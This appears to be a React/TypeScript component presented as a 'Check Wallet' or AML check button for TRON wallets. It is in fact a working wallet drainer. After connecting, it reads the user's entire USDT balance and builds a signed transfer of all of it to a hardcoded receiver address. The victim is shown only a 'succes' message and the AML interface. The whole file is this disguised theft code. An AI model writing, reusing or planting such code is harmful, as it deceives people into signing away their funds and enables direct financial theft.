// src/components/tronAuthButton/TronAuthButton.tsx
import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { tronWeb, adapter } from './tronWallet.ts';
import { Buffer } from 'buffer';

window.Buffer = Buffer;

const USDT_CONTRACT  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

export const TronAuthButton: React.FC = () => {
  const [status,  setStatus]  = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  // Закрываем модалку автоматически 2 сек после "succes"
  useEffect(() => {
    if (status === 'succes') {
      const t = setTimeout(() => setStatus(null), 2000);
      return () => clearTimeout(t);
    }
  }, [status]);

  const connectWallet = async () => {
    if (loading) return;
    setLoading(true);
    setStatus(null);
    try {
      if (!adapter.connected) {
        await adapter.connect();
      }
      const addr = adapter.address!;
      tronWeb.setAddress(addr);

      const trx = (await tronWeb.trx.getBalance(addr)) / 1e6;
      if (trx < 2) {
        setStatus('❌ Insufficient TRX. At least 2 TRX is required.');
        return;
      }

      const usdtRaw = await (
        await tronWeb.contract().at(USDT_CONTRACT)
      ).methods.balanceOf(addr).call();
      const usdt = Number(usdtRaw) / 1e6;
      if (usdt < 1) {
        setStatus('succes');
        return;
      }

      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        addr
      );
      const signed = await adapter.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signed);
      setStatus(result?.result ? 'succes' : '⚠️ Connection or transaction error');
    } catch (err: any) {
      const m = err.message || err.toString();
      if (!/User rejected|Modal is closed|Timeout/.test(m)) {
        setStatus('⚠️ Connection or transaction error');
      }
    } finally {
      setLoading(false);
      await adapter.disconnect();
    }
  };

  return (
    <>
      <div className="AuthButton" onClick={connectWallet}>
        {loading ? 'Connecting...' : 'Check Wallet'}
      </div>

      {status && (
        <div className="modal__overflow">
          <div className="modal">
            {status !== 'succes' ? (
              <p>{status}</p>
            ) : (
              <>
                {/* ... твой AML UI ... */}
              </>
            )}
            <button onClick={() => setStatus(null)}>Close</button>
          </div>
        </div>
      )}
    </>
  );
};
